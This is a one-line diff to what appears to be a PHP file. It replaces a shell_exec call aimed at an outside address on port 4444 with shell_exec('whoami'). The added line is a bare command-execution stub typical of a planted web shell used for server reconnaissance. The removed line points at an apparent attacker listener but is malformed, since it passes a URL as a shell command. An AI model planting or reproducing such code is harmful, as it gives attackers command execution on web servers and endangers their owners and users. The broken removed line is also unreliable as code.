@@ -1,1 +1,1 @@
-<?php shell_exec("http://192.168.225.59:4444");?>
+<?php shell_exec("whoami");?>
